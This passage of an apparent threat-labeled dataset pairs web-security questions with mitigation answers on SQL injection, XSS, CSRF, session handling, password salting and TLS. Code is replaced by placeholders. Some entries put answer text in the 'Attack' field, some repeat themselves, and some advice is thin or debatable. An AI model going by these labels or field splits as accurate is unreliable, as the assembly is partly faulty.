    "Attack": " I have a html form that accepts user entered text of size about 1000, and is submitted to a php page where it will be stored in mysql database. I use PDO with prepared statements to prevent sql injection. But to sanitize the text entered by user, what are the best efforts needed to do ?  I want to prevent any script injection, xss attacks, etc. ",
    "Mitigation": " 1) Use parameterised queries<br />Parameterised queries force the values passed to the query to be treated as separate data, so that the input values cannot be parsed as SQL code by the DBMS. A lot of people will recommend that you escape your strings using [CODE], but contrary to popular belief it is not a catch-all solution to SQL injection. Take this query for example:  [CODE]  If [CODE] is set to [CODE], there are no special characters and it will not be filtered. This results in all rows being returned. Or, even worse, what if it's set to [CODE]?  Parameterised queries prevent this kind of injection from occuring.  2) Validate your inputs<br />Parameterised queries are great, but sometimes unexpected values might cause problems with your code. Make sure that you're validating that they're within range and that they won't allow the current user to alter something they shouldn't be able to.  For example, you might have a password change form that sends a POST request to a script that changes their password. If you place their user ID as a hidden variable in the form, they could change it. Sending [CODE] instead of [CODE] might mean they change someone else's password. Make sure that EVERYTHING is validated correctly, in terms of type, range and access.  3) Use htmlspecialchars to escape displayed user-input<br />Let's say your user enters their \"about me\" as something like this:<br />[CODE]<br />The problem with this is that your output will contain markup that the user entered. Trying to filter this yourself with blacklists is just a bad idea. Use [CODE] to filter out the strings so that HTML tags are converted to HTML entities.  4) Don't use $_REQUEST<br />Cross-site request forgery (CSRF) attacks work by getting the user to click a link or visit a URL that represents a script that perfoms an action on a site for which they are logged in. The [CODE] variable is a combination of [CODE], [CODE] and [CODE], which means that you can't tell the difference between a variable that was sent in a POST request (i.e. through an [CODE] tag in your form) or a variable that was set in your URL as part of a GET (e.g. [CODE]).  Let's say the user wants to send a private message to someone. They might send a POST request to [CODE], with [CODE], [CODE] and [CODE] as parameters. Now let's imagine someone sends a GET request instead:  [CODE]  If you're using [CODE], you won't see any of those parameters, as they are set in [CODE] instead. Your code won't see the [CODE] or any of the other variables, so it won't send the message. However, if you're using [CODE], the [CODE] and [CODE] get stuck together, so an attacker can set those parameters as part of the URL. When the user visits that URL, they inadvertantly send the message. The really worrysome part is that the user doesn't have to do anything. If the attacker creates a malicious page, it could contain an [CODE] that points to the URL. Example:  [CODE]  This results in the user sending messages to people without ever realising they did anything. For this reason, you should avoid [CODE] and use [CODE] and [CODE] instead.  5) Treat everything you're given as suspicious (or even malicious)<br />You have no idea what the user is sending you. It could be legitimate. It could be an attack. Never trust anything a user has sent you. Convert to correct types, validate the inputs, use whitelists to filter where necessary (avoid blacklists). This includes anything sent via [CODE], [CODE], [CODE] and [CODE].  <br /><br />If you follow these guidelines, you're at a reasonable standing in terms of security. "
  },
  {
    "Threat": "D",
    "Attack": " How does challenge-response authentication prevent man-in-the-middle attacks? I read the wiki article but still I cannot understand.  Where challenge/response protocols really shine is in preventing replay attacks: if Alice just sends Bob a message along the lines of \"Please debit my account $5 and credit your account $5\", Mallory could record the message and replay the message to deplete Alice's account. ",
    "Mitigation": " A good challenge/response system will generate a new challenge for every transaction or session (and make sure that previous challenges are not reused!), so that session transcripts cannot be spliced together to create new fraudulent systems. "
  },
  {
    "Threat": "I",
    "Attack": " Above is the code, as it appeared on the pages. I have played around with this code and it seems to get user information using:  It is then combined into a url similar to the one below, but with the user information from above added to the url ",
    "Mitigation": " EDIT: As [LINK] pointed out in his comment, this appears to be printing only if it receives a string where the second, third, and fourth characters are [CODE], meaning it likely only prints to the page if it received a [CODE] tag. "
  },
  {
    "Threat": "T",
    "Attack": " No. Cookies can be stolen via XSS attacks (and other vectors)Also, this might be susceptible to CSRF since a cookie will be submitted automatically with any request. ",
    "Mitigation": " Basically, you should give the token to the user over a secured connection (HTTPS) but they should manually submit it for security (again over HTTPS) "
  },
  {
    "Threat": "E",
    "Attack": "   If you give yourself write privilege to the system site-packages,  you're risking that any program that runs under you (not necessarily  python program) can inject malicious code into the system  site-packages and obtain root privilege. ",
    "Mitigation": " The problem is not with having access to site-packages (you have to have privilages for site-packages to be able to do anything). The problem is with having access to the system site-packages. A virtual environment's site-packages does not expose root privilages to malicious code the same as the one that your entire system is using.  However, I see nothing wrong with using [CODE] for well known and familiar packages. At the end of the day, it's like installing any other program, even non-python. If you go to its website and it looks honest and you trust it, there's no reason not to sudo.   moreover, pip is pretty safe - it uses https for pypi and if you [CODE] it will download packages from third-party, but will [LINK] and compare them. For third-party with no checksum you need to explicitly call [CODE] which is the only option considered unsafe.  As a personal note, I can add that I use sudo pip most of the times, but as a WEB developer virtualenv is kind of a day-to-day thing, and I can recommend using it as well (especially if you see anything sketchy but you still want to try it out). "
  },
  {
    "Threat": "I",
    "Attack": " Since the verification file is within the web servers root structure, and Google needs to access it to read its contents - Technically anyone could read it if they wanted by going to [LINK].  ",
    "Mitigation": " With that in mind, I wouldn't add it to the github repository as it isn't something anyone would need to either clone the repository and create their own version, or fork and create change requests. It doesn't have any value to anyone other than you. "
  },
  {
    "Threat": "D",
    "Attack": " The problem is that the attacker simply adds a slash then some encoded javascript (an image tag with alert box), which kills the page.  Simple and effective attack.   ",
    "Mitigation": " The solution is simple. I run [CODE] through a filter before using, and any passed garbage is cleaned and safe to use on the page.  "
  },
  {
    "Threat": "T",
    "Attack": " and now, if both ways are vulnerable to code injectios, is there anyother way to implement HTML tags in the same way as a string into HTML Pages? ",
    "Mitigation": " Both are safe if you are in complete control of all aspects of the string being used.  Having said that, in general, [CODE] is for small fragments of HTML to be inserted and parsed into a document, not large strings (as you have here) because it becomes a nightmare to support.   When you have large amounts, such as what you are showing here, the [LINK] and JavaScript [LINK] may be preferable as you have a more simple way of injecting content as a series of DOM nodes that lend themselves to easier manipulation via an API than a bunch of string concatenations. This allows you to have the elements created dynamically and then you can populate them using [CODE], rather than [CODE], which removes the security issues since the text is not parsed as HTML. "
  },
  {
    "Threat": "D",
    "Attack": " I am playing with image uploads to a website and I found out about these decompression bomb attacks that can take place when it's allowed to upload [CODE] files (and some other). Since I am going to change the uploaded images, I want to make sure I don't become a victim of this attack. So when it comes to checking if a [CODE] file is a bomb, can I just read the file's headers and make sure that width and height are not more than the set limit, like 4000x4000 or whatever? Is it a valid method? Or what is the better way to go? ",
    "Mitigation": " Besides large width and height, decompression bombs can also have excessively large iCCP chunks, zTXt, chunks, and iTXt chunks. By default, libpng defends against those to some degree. "
  },
  {
    "Threat": "T",
    "Attack": " [LINK] gives me concern about the potential for a [LINK], in a case where my application has become compromised via script injection. ",
    "Mitigation": " The good news is that an enumeration attack would be fairly difficult, as we throttle requests by origin to mitigate any brute force approaches. "
  },
  {
    "Threat": "S",
    "Attack": " I have followed the advice below to protect against any attack but think that the site is still vulnerable if somebody manages to get at the cookie (albeit only for a short time). Is there a way to completely destroy the forms authentication session on logout so that even if someone had stolen the cookie there would be no chance of using it maliciously ",
    "Mitigation": " A simple idea is to generate a random guid and store it in the user data section of the cookie. Then, when a user logs out, you retrieve the guid from the user data and write it in a server side repository with an annotation that this \"session\" has ended.  Then, have an http module that checks upon every request whether or not the guid from the userdata section of your cookie doesn't point to a ended session. If yes, terminate the request with a warning that expired cookie is reused.  This comes with a cost of an additional lookup per request.  "
  },
  {
    "Threat": "T",
    "Attack": " But when you send something like [CODE], it is executed on every client browser.  How can I be 100% sure of not having a XSS vulnerability on my chat? ",
    "Mitigation": " Don't use [CODE] because that's basically [CODE] on steroids - capable of causing the interpretation of a good variety of languages.  Text is always interpreted as text though:  [CODE] "
  },
  {
    "Threat": "E",
    "Attack": " I have a standalone Spark cluster running on a remote server and I'm new to Spark. It appears that there's no authentication scheme protecting the cluster master's (7077) port by default. Anyone can just simply submit their own code to the cluster without any restrictions. ",
    "Mitigation": " there are 2 parts to enable support of authentication:    setting the secret on the master an all the slavesusing the same secret when submitting jobs to the cluster  <h1>master and slaves</h1>  on each server in your cluster, add the following config to [CODE]:    [CODE]  <h1>submitting jobs</h1>  when you initialize the spark context, you should add the same config to it as well, ie:  [CODE]  or if you are using SparkSession:  [CODE] "
  },
  {
    "Threat": "S",
    "Attack": " Can ANYONE from ANYWHERE intercept my POST data just by listening for it, perhaps with some third party software like Firesheep?    Can ANYONE from ANYWHERE intercept my POST data just by listening for it, perhaps with some third party software like Firesheep? ",
    "Mitigation": " Unless it only travels across a LAN, then yes. If it does only travel across a LAN then add the qualifier \"on that LAN\" and the answer will be yes.  No  Certainly you shouldn't do anything serious without encryption.  It would make sense to do so for any system. Even if the communication was secure, your server could be compromised in the future, or a third party system could be and then the data there used to attack your system. "
  },
  {
    "Threat": "S",
    "Attack": " i'm trying to implement secure CSRF protection to HTML login form,i know the best way to implement CSRF protection is storing random csrf_key in a session,but i want to add CSRF to my login &amp; register forms... and i do not want to store many sessions for any anonymous unregistered users...  can you spot any specific security risk with this implementation? or can i assume this is a secure way of doing CSRF protection?  The method with storing the CSRF token in cookie is quite widely used ([LINK], [LINK]) but it works a bit differently. The server sends the token in cookie, the client uses JavaScript to read the cookie and reflect the token in a HTTP header. The server should only verify the value from the HTTP header, even though the cookie will be sent automatically as well.  This prevents CSRF because only JavaScript running from the authentic origin will be able to read the cookie (see [LINK] on Wikipedia). The token can be a HMAC of the session cookie, which avoids the need to remember token state on the server side.  The main advantage is that this approach (unlike the one with token in form fields) works with single-page, JavaScript based applications where you don't generate the HTML on the server and can't really embed the CSRF token in their code. ",
    "Mitigation": " The method with storing the CSRF token in cookie is quite widely used ([LINK], [LINK]) but it works a bit differently. The server sends the token in cookie, the client uses JavaScript to read the cookie and reflect the token in a HTTP header. The server should only verify the value from the HTTP header, even though the cookie will be sent automatically as well.  The actual cookie and header names are not important as soon as both JavaScript frontend and backend are aware of them.  This prevents CSRF because only JavaScript running from the authentic origin will be able to read the cookie (see [LINK] on Wikipedia). The token can be a HMAC of the session cookie, which avoids the need to remember token state on the server side.  The main advantage is that this approach (unlike the one with token in form fields) works with single-page, JavaScript based applications where you don't generate the HTML on the server and can't really embed the CSRF token in their code. "
  },
  {
    "Threat": "I",
    "Attack": " the password hashing all takes place server side, and the hashes are stored in the database. The client has no way to see these.a rainbow table attack must have knowledge of the hashes in order to retrieve passwords.  So, is the point of trying to foil a rainbow table attack simply to protect the retrieval of passwords from an already compromised database/system. Is it that simple or is there something else that I am missing. ",
    "Mitigation": " Use strong, unique passwords! "
  },
  {
    "Threat": "E",
    "Attack": " I have noticed that our temp directory has a number of what appear to be temporary files with names like phpA3F9.tmp   This appears to be an attack attempt, but I presume it relies on the attacker being able to execute the code in the tmp folder.  Those are PHP shells - mostly harmless where they are, but if they get into your web root, they'll allow an attacker to execute any arbitrary code on your server.  ",
    "Mitigation": " So what to do about it? Check your server logs - if you see any successful connections to a script that you don't recognize, you may be compromised. Look for any upload forms on your site, and lock them down (require user authentication, etc.), and then if you're certain that you're compromised, don't bother trying to clean it. Spin up a new server, migrate your clean code, important files, and data to the clean server. "
  },
  {
    "Threat": "S",
    "Attack": " What defines the two respectively?Session fixation is described as:Session Fixation is an attack that permits an attacker to hijack a valid user session. The attack explores a limitation in the way the web application manages the session ID, more specifically the vulnerable web application.`The Source: [LINK]Which seems rather close to what CSRF exploits. What distinguishes the two from eachother or is [CODE] simply a synonym or a branch coming from CSRF?Would also like to mention that key terminology coming from the OWASP link I provided is almost identical to those mentioned in CSRF  No, it is not a synonym. Session Fixation and CSRF are two different attacks.  Session fixation is a class of Session Hijacking. Attacker tries to steal, guess or fix session id, then use it and log in on target website as victim. It could be done many ways. Basic protection is if app uses httpOnly flag, does not transfer session id in url (session.use_trans_sid=0, session.use_only_cookies=1) and takes care of XSS vulnerabilities.  CSRF is another kind of attack. Attacker does not want victim session id but rather causing the victim to perform an action on server where victim is properly logged in. So the victim performs malicious action itself but does not know about it. How? Victim loads a page somewhere that contains malicious link in html (ie. img src) or target website contains XSS vulnerability and it is  good point for loading external malicious javascript and issuing ajax requests.  Standard protection is CSRF token. It is another token (next of session id) that is included in each sensitive request. Attacker should not know current CSRF token for particular user and can not prepare malicious link or ajax request. CSRF token should be unique for each session. Sensitive requests are form submissions, deleting/setting of something (permission etc.). So app does not have to protect absolutely each request. It also is not good idea to transmit CSRF token in URL. ",
    "Mitigation": " Session fixation is a class of Session Hijacking. Attacker tries to steal, guess or fix session id, then use it and log in on target website as victim. It could be done many ways. Basic protection is if app uses httpOnly flag, does not transfer session id in url (session.use_trans_sid=0, session.use_only_cookies=1) and takes care of XSS vulnerabilities.  Standard protection is CSRF token. It is another token (next of session id) that is included in each sensitive request. Attacker should not know current CSRF token for particular user and can not prepare malicious link or ajax request. CSRF token should be unique for each session. Sensitive requests are form submissions, deleting/setting of something (permission etc.). So app does not have to protect absolutely each request. It also is not good idea to transmit CSRF token in URL. "
  },
  {
    "Threat": "S",
    "Attack": " But how secure is that? Can a user executing the program easily set this property to an arbitrary value (using a command-line argument of the JVM, for example) for common runtime environments? Can a user easily spoof this user name? ",
    "Mitigation": " Note that since Java 11 the [CODE] property is effectively read only once the program starts, so malicious program code can not spoof it. "
  },
  {
    "Threat": "S",
    "Attack": " My QA team simply does MiTM attack for every network call, they try to use their certificate and if for any network call I don't verify certificate then they can easily read the data. Because of cache I'm unable to verify my certificate. ",
    "Mitigation": " The answer to this question is that this method will be called again if you switch your network. The response or result of the authentication is persistent for a session and as long as the session is valid, the connection is secured. So just rely on the framework's method and keep your communication secured :) "
  },
  {
    "Threat": "E",
    "Attack": " Google can delete and install apps silently ([LINK]). If someone hacks this mechanism, an attacker can install arbitrary apps on a device. Unsure if this app has automatically all rights it wants to have. This doesn't happens till now, but it's possible. You can only protect your phone by checking regularly all installed apps and there rights. This mechanism can be misused by a hacker.Malicious applications can do a lot evil things, but if you don't give every app the rights the apps wanted and think a little bit, you can protect your phone.Some security holes in the browser or the system allows an app to get root-access. In this case the app can do everything it wanted. I don't know any protection against this. As far as I know android has such security holes, so this is the most dangerous issue. ",
    "Mitigation": " So in summary the only secure protection of data seems to be encryption. Depending on how secure your data must be with a default key or an individual key (in other words a password).  Some time ago I've found these PDF's, maybe they can help: [LINK], [LINK] (more than 2 years old). "
  },
  {
    "Threat": "I",
    "Attack": " Now what i want to say suppose if bcrypt is hacked and is found to be broken and in future there comes new cryptographic function that is more secure and. Than this way creating a password from old values will always be time consuming. ",
    "Mitigation": "   The new Secure Password Hashing API in PHP 5.5    The RFC for a new simple to use password hashing API has just been accepted for PHP 5.5. As the RFC itself is rather technical and most of the sample codes are something you should not use, I want to give a very quick overview of the new API:    Why do we need a new API?    Everybody knows that you should be hashing their passwords using bcrypt, but still a surprising number of developers uses insecure md5 or sha1 hashes (just look at the recent password leaks). One of the reasons for this is that the crypt() API is ridiculously hard to use and very prone to programming mistakes.    By adding a new, very simple to use API we hope to move more developers towards bcrypt.    How to hash passwords    Creating password hashes can't be any simpler than this:  [CODE]    This will create a password hash using the default algorithm (currently bcrypt), the default load factor (currently 10) and an automatically generated salt. The used algorithm and salt will also be part of the resulting hash, so you don't need to worry about them at all ;)    If you don't want to stick with the defaults (which might change in the future), you can also provide algorithm and load factor yourself:  [CODE]    Verifying passwords    Verifying passwords is just as easy:  [CODE]    Remember: The salt and algorithm are part of the hash, so you don't need to provide them separately.    Rehashing passwords    As time goes by you might want to change the password hashing algorithm or load factor, or PHP may change the defaults to be more secure. In this case new accounts should be created using the new options and existing passwords rehashed on login (you can do this only on login because you need the original password to do a rehash).    Doing this is also very simple:  [CODE]    The above snippet will keep your hashes up to date with the PHP default. But once again you can also specify custom options, e.g. [CODE].    Compatibility layer for older PHP versions    The new API will only be introduced in PHP 5.5, but you can already use a PHP implementation of the same API now! The compatibility implementation will automatically disable itself once you upgrade to 5.5. "
  },
  {
    "Threat": "S",
    "Attack": " The sandbox would be executing scripts that could be potentially dangerous.  The sandbox would be a mix of my own JavaScript, running alongside untrusted JavaScript code from other sources. ",
    "Mitigation": " There are risks associated with untrusted and unsafe Javascript - no matter whether it is run in an iframe or not. However the [LINK] dictates that any scripts in your sandbox will not be able to interfere with anything in [CODE]. "
  },
  {
    "Threat": "S",
    "Attack": " On step 4. where did the WCF service located it's private key?Why is the SSL certificate needed? from reading on the internet it is needed to verify that the Service is who I want it to be. That does not make sense to me because first I know the IP address of my service on my local network (I know who that service is). Pretend this is not the case I am on the internet and someone is trying to hack me. In that case then I believe that if I connect to their service instead of my real one there is nothing I could do because if you recall on step 2 the WCF service replied with the public key and the certificate (on plain text) that means that someone could grab that certificate and use it?If I use a SSL sertifiate and someone has access to the computer that is hosting the service he could somehow get the private key making my connections insecure? ",
    "Mitigation": " Yes. The security of the entire system depends on the private key remaining private. That's why its called the private key. If an attacker gains access to your private key then they can impersonate you at will, so keep it secret, keep it safe. If your key is compromised there is a mechanism whereby the certificate can be revoked, but the damage will typically already be done. "
  },
  {
    "Threat": "T",
    "Attack": " I used the [CODE] function on [CODE] to stop SQL injection but some friends told me that's not enough security. However, they didn't show me how to exploit this vulnerability. ",
    "Mitigation": " You should use [LINK] for escaping string input parameters in a query. Use type casting to sanitize numeric parameters and whitelisting to sanitize identifiers.     A better solution would be to use prepared statements, you can do this by using [LINK] or [LINK]. "
  },
  {
    "Threat": "E",
    "Attack": " My question is how to store those private keys? Is it safe to hard-code them using [CODE]? Or  If user jailbreaks iPhone with this app installed, couldn't he get those hard-coded keys? How can i hide them most effectively? ",
    "Mitigation": " What others apps do is require the user to \"log in\" before they can use the app. Then you use their userid/password as a key to encrypt the keys or use a secured web service to get the keys for that user.  If you use a [CODE] or even an NSString, there are ways to guess the keys. Obviously, you have to truly be willing to spend a lot of time to find those keys in compiled code, but depending on the level of security you are looking for and the people you are guarding against, this might be a problem. "
  },
  {
    "Threat": "D",
    "Attack": " Somewhere my development machine was responding to a request for a specific page that needed authorization and presented a log in screen to someone. It wasn't on my machine. No one else in my office has the technical ability, or the interest, to do a hack on my machine. So it must be coming from my wireless router or through our internet connection... i'm guessing. ",
    "Mitigation": " Just a reminder to set all of the controller methods you don't want to be visible to the outside world directly as private or protected. Also double check your routes file to ensure that you are avoiding less safe route definitions like match, if possible.  While this shouldn't entirely assuage your security concerns, being proactive about limiting the possible access attackers can gain will serve your project for the best. Additionally, you could set up thin to bind to 127.0.0.1 instead of 0.0.0.0, thereby preventing external requests (if possible). "
  },
  {
    "Threat": "I",
    "Attack": "   To make it impossible for an attacker to create a lookup table for every possible salt, the salt must be long. A good rule of thumb is to use a salt that is the same size as the output of the hash function. For example, the output of SHA256 is 256 bits (32 bytes), so the salt should be at least 32 random bytes. ",
    "Mitigation": " No, you don't need your salt to be the same length as the password. In fact, none of the implementations listed in the article do that. Generally for each added bit of salt you're requiring an attacker to double his storage budget.    So having a 10 byte salt should be sufficient for today's level of technology.  Also note that the salt is binary value whereas passwords are not, so the salt length should be measured in bits/bytes and not characters. "
  },
  {
    "Threat": "I",
    "Attack": " When the file is uploaded, is it stored in a temporary directory (e.g. Windows Temp directory) and how do I clear all traces from there?Can the contents of the file be written to virtual memory and how do I ensure it is not or remove the contents once written?If I encrypt the file, would I still have to worry about the contents being saved to the Temp directory, virtual memory or elsewhere before the file was encrypted?Can I perform a secure delete in all the concerned about locations (temp, virtual memory, any others) and how do I do this?Are there any concerns I have missed or an alternate way to achieve the stated goal? ",
    "Mitigation": " <h1>Disk security</h1>You can let wipe utility do the job for you.If you are running ASP.NET on Mono/Linux, you can use the [CODE] command via [CODE] class (ensure that wipe package is installed).If you run Windows, the approach is the same. Use a [CODE] utility that performs hard cleanup when you need to safely dispose of the file.I fond [LINK] website that distributes a free wipe.exe, which is not included in Windows standard installation (too bad).Second way is to implement the [LINK], but I think it's cheaper to use someone else's code.Bear in mind that wipe is very I/O intensive, don't wait for it to complete or you may slow down your application dramatically. Also, on highly loaded websites you might experience a significative slow down.<h1>Memory security</h1>The [CODE] class helps you leave no trace of a string in memory. But when you work with files you actually work with streams. I'm not sure if worrying about the contents of volatile memory (even if you handle Wikileaks documents).You must first perform a threat analysis telling you what are the major threats to memory. Here are some questions:Can someone access the server with an Administrator/root account with the ability to perform a memory dump? (Regular users can't read your memory and .NET prevents buffer overrun because of pointers being unused)Can someone physically access the server? Don't you trust your hosting provider enough? Do you run a virtual server instead?If answer is not yes you shouldn't worry about memory security<h1>Swap space security</h1>Even if you run on Windows, let me call &quot;swap&quot; the paging file, or virtual memory file, or whatever. You might think about disabling it (be sure you have plenties of RAM) or, else, you might think about encrypting it (but you get a performance drop).But again, in order for somebody to scan your swap file at runtime, he must be root, or have physical access to the shut down server.If data is too sensitive, I would go for disabling swap.[Add] I'm sure that you already use SSL to upload the file, just in case you forgot some principles... "
  },
  {
    "Threat": "T",
    "Attack": " Serializing Java Beans to XML using [LINK] and [LINK] seems like a pretty neat approach: many classes from many sources can be serialized reliably, just using their public interface. Using this aproach to serialization is even suggested in many places of the API reference. But the [LINK] used for this seems quite powerful. Are there any security mechanisms which will prevent attacks originating from malicious documents? Or should the use of [CODE] on untrusted documents be avoided for security reasons? ",
    "Mitigation": " The deserialization of XML-serialized beans can cause prety much any operation which the JVM can perform. To give you an ugly examle, consider the following document which will write a certain file without any questions being asked:  For this reason, I strongly advise against simply reading data from untrusted sources using [CODE].  Either validate the document to a well-defined and harmless subset of the XML language, or use your own formats together with technologies such as [LINK]. Or perform the deserialization in a tightly controlled environment, with security managers which will disallow any unexpected operation. "
  },
  {
    "Threat": "S",
    "Attack": "",
    "Mitigation": " 1)Use [LINK]. (Makes it so JavaScript cannot access document.cookie,  but you can still do session riding with xss)  2)Use \"[LINK]\"  (Horrible name, but its a flag that forces the browser to make the cookie HTTPS only.)  3)Scan your web application for xss using [LINK] or [LINK]  Also don't forget about CSRF! (Which firesheep doesn't address) "
  },
  {
    "Threat": "T",
    "Attack": " Below is an example of JSON that has a dangerous script injected and needs \"cleaning.\" I want a want to manage this before I de-serialize it. But we need to assume all kinds of XSS scenarios, including BASE64 encoded script etc, so the problem is more complex that a simple REGEX string replace.  JSON is posted from a 3rd party UI interface, so it's fairly exposed, hence the server-side validation. From there, it gets serialized into all kinds of objects and is usually stored in a DB, later to be retrieved and outputted directly in HTML based UI so script injection must be mitigated. ",
    "Mitigation": " The first step is to extract whichever JSON values need to be sanitized as HTML, and for each of those objects you need to run them through an HTML parser and strip away everything that is not in a whitelist. Don't forget that you will also need a whitelist for attributes.   Your worry about base64 strings seems a little over-emphasized in my opinion. It's not like you can simply put [CODE] into an HTML document and the browser will render it. It can be abused through javascript (which your whitelist will prevent) and, to some extent, through [CODE] urls (but this isn't THAT bad, as javascript will run in the context of the data page. Not good, but you aren't automatically gobbling up cookies with this). If you have to allow [CODE] tags, part of the process needs to be validating that the URL is http(s) (or whatever schemes you want to allow).   Ideally, you would avoid this uncomfortable situation, and instead use something like [LINK] - then you could simply escape the HTML string, but this is not always something we can control. You'd still have to do some URL validation though.  "
  },
  {
    "Threat": "I",
    "Attack": " I receive data, and use aes or blowfish to encrypt it before saving it to the database, so the encryption is done at the application level. If someone steals the database, the data will be relatively safe unless they stole the application also (where the key is stored/accessed).   But I don't quite understand how database encryption works. If the application only passes raw unaltered data to the database, and the database decrypts the data itself somehow, wouldn't that make database-level encryption less secure if the database was stolen since 100% of the encryption component was stolen?   In my current situation, if a database is stolen, the attacker would have to steel the second component (the key which is at the application level) to decrypt the database. But with database encryption, the database itself has full responsibility of the encryption, so by stealing the database, wouldn't the attacker have everything needed to decrypt the database? ",
    "Mitigation": " Plaintext - if it's in plaintext somewhere in the filesystem then that's your weak point. Maybe it's in the application code, maybe in a config file somewhere. In any case, someone who gains administrator access to the server (or simply steals the hard drive) has what they need, and obscurity is your only protection.Manually-entered - If you have a human user enter the key when the application/database/pc is started, then you mostly* alleviate the issue of a plaintext key. In exchange, you require a user to remember the key and you give up the ability to have a completely automated restart (bad news for a server that needs to stay up).  * I say mostly because technically the key is still available in plaintext somewhere in RAM. But that's a lot harder to get at than something stored on disk (memory swapping notwithstanding).  Regarding MySQL specifically, you might find [LINK] helpful. "
  },
  {
    "Threat": "I",
    "Attack": " 2) If someone were to gain access to the cookies and they copy them to a different computer, and then try accessing the website from that computer, theoretically, it will automatically log them in to that user's account, is this not a security issue?  3) In a scenario where some user with malicious intents were to gain access to the database, a secure website would have salted and hashed passwords making it rather difficult for the hacker to gain access into multiple accounts (if at all). But, by simply playing around with the hash and salt values and creating a cookie that matches the values they've changed on the database, they can effectively get access to any account they want, rendering the whole password-hashing process as useless. Therefore, this cookie approach I'm using now is compromising my entire database and all my users' accounts.    If someone were to gain access to the cookies and they copy them to a different computer, and then try accessing the website from that computer, theoretically, it will automatically log them in to that user's account, is this not a security issue?    they can effectively get access to any account they want, rendering the whole password-hashing process as useless. ",
    "Mitigation": " Don't store the password in the cookie, hashed or not. In fact, there's no reason to store anything sensitive in the cookie. All you need to do is map a 128-bit (or larger) random id to a user account in your database, and store that id in the cookie. There is no way somebody is going to guess a valid id by remote brute force, especially if you have lock-outs in place.  Yes. That's the downside to the feature. However, if your website detects new IP address (particularly from different countries) and requires a second step (text a code to a mobile device, etc), then you take care of this problem along with the general problem of a stolen password. (This of course doesn't help prevent local network attacks, like an insecure public wifi.)  A more convenient solution is to require the \"remember me\" cookie to use SSL. That way a hacker would not ever see the cookie in plain text transmission, and a local attack would probably be required. (And if such, the remember me cookie is probably the least of the user's concerns.)    they can effectively get access to any account they want, rendering the whole password-hashing process as useless.  Yes, and no. If you use the technique I described (random id) then they can only access accounts that have a \"remember me\" cookie. But that said, if they have access to your database, they can brute force any account they want. Even salted passwords are easy to crack locally if the password itself is weak.  Also, you can consider the \"remember me\" login to be a half-login. Access to purchase something, change an email address, etc, would still require a password to be entered. Doing harmless things like posting on a message board could be done without the password.  Finally, note that a PHP session cookie is nothing more than a temporary \"remember me\" token! So much of this applies to the concept of session hijacking. The \"remember me\" token simply adds a bigger window of opportunity.  So in short: don't store anything sensitive in the cookie, require SSL for the cookie, and if possible, implement multi-factor authentication ... especially for admin accounts. "
  },
  {
    "Threat": "I",
    "Attack": " What I don't understand is the role of salt in my scenario. Usually salt is used in hashing passwords to prevent dictionary attacks. But in my scenario the PBKDF2 algo is used to compensate weaknesses of short or easy to guess clear text passwords by adding extra calculations required by the PBKDF2-rounds.  If I choose a random salt then the receiver will need to know that salt also in order to decrypt correctly. If I use a constant salt, then hackers can easily reverse engineer my code and run brute force attacks using my constant salt (although they'll be really slow thanks to the PBKDF2 iterations). ",
    "Mitigation": " The recommended approach in your case is to generate a random salt every time a file is encrypted, and transmit the salt along with the ciphertext. "
  },
  {
    "Threat": "S",
    "Attack": " As i understand, there are two main vulnerabilities while using SSL:1) There are many CA provider companies now, so nobody is protected from MITM attack, where normal certificate is used by crackers (i found some articles, where it was said that VeriSign had secret department, that was providing secret services for MITM, when VeriSign was the only CA worldwide)2) Most MITM attacks are possible while using ARP Cache Poisoning   We decided to use HTTPs instead of HTTP, but after googling iunderstood that SSL only is not enough.I'm not sure what you've googled, but SSL/TLS, when used correctly, can protect you against MITM attacks.If this solution (SSL + symmetric encryption algorythm) is ok, couldyou please advice most suitable encryption algorithms for this kind ofissue?Encryption in SSL/TLS is already done using symmetric cryptography. Only the authentication is done via asymmetric cryptography.As i understand, there are two main vulnerabilities while using SSL:There are many CA provider companies now, so nobody is protectedfrom MITM attack, where normal certificate is used by crackers (ifound some articles, where it was said that VeriSign had secretdepartment, that was providing secret services for MITM, when VeriSignwas the only CA worldwide) 2) Most MITM attacks are possible whileusing ARP Cache PoisoningProtecting against MITM attacks is exactly the purpose of the certificate. It is solely the responsibility of the client (a) to check that HTTPS is used when it's expected and (b) to check the validity of the server certificate.The first point may be obvious, but this is the kind of attacks that tools like sslstrip do: they're MITM downgrade attacks that prevent the user to get to the HTTPS page at all. As a user, make sure you're on an HTTPS page when it should be HTTPS. In a corporate environment, tell your users they must check that they're accessing your server via HTTPS: only they can know (unless you want to use client-certificate authentication too).The second point (the certificate validation) is also up to the client, although most of it is automated within the browser. It's the user's responsibility not to ignore browser warnings. The rest of the certificate validation tend to be done via pre-installed CA certificates (e.g. Verisign's).If there's an MITM attack taking place (perhaps via ARP poisoning), the user should be get an incorrect certificate and should not proceed. Correct HTTPS verifications should allow you to have a secure connection or to have no connection at all.The vulnerabilities you're mentioning have to do with the certificate verification (the PKI model). Indeed, verifying that the server certificate is correct depends on the CA certificates that are trusted by your browser. There, any trusted CA could issue a certificate for any server in principle, so this model is a good as the weakest CA in the list. If one a the trusted CAs issues a fake certificate for a site and gives it to another party, it's as good as having a passport office issuing a real &quot;fake&quot; passport. It's quite tricky to counter, but there are ways around it.You could rely on extensions like the [LINK], which monitor certificate changes, even if both are trusted. Such a warning should prompt the user to investigate whether the certificate change was legitimate (done by your company) or not.More radically, you could deploy your own CA, remove all the trusted CA certificates from the user browser and install only your own CA certificate. In this case, users will only be able to connect securely to machines that have certificates issued by your CA. This could be a problem (including for software updates if your browser uses the OS certificate repository).In principle, you could avoid certificate altogether and use [LINK] cipher suites. However, this is not supported by all SSL/TLS stacks, and not necessarily adapted for HTTP over TLS (lacking specification regarding the host name verification, as far as I know).You may also be interested in these questions on Security.SE:[LINK][LINK] ",
